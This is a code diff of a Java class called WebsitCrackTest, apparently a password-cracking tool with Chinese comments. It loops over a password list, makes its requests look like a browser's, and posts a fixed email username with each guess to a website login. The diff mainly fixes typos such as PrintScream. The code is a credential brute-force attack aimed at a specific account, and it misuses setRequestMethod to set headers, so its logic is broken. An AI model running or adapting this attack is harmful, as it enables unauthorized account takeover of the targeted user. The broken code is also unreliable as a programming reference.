@@ -27,7 +27,7 @@ public class WebsitCrackTest
 		{
 			while((passwd=br.readLine())!=null)
 			{
-				//设置请求特性，假装成一个浏览器的请求特性
+				//设置请求特性，假装成一个浏览器发出请求。
 				huc.setRequestMethod("Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
 				huc.setRequestMethod("Accept-Encoding:gzip,deflate,sdch");
 				huc.setRequestMethod("Accept-Language:en,zh-CN;q=0.8,zh;q=0.6,en-US;q=0.4");
@@ -46,7 +46,7 @@ public class WebsitCrackTest
 				huc.connect();
 				
 				//打开本机的输出流，也就是远程主机的输入流,向远程主机发送数据
-				PrintScream ps = new PrintStream(huc.getOutputScream());
+				PrintStream ps = new PrintStream(huc.getOutputStream());
 				ps.print("username =trileverwt31204@sina.com&passwd = " +passwd);
 				ps.flush();
 				
@@ -67,15 +67,3 @@ public class WebsitCrackTest
 		}
 	}
 }
-
-
-
-
-		
-		
-
-
-
-
-
-User-Agent:Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36
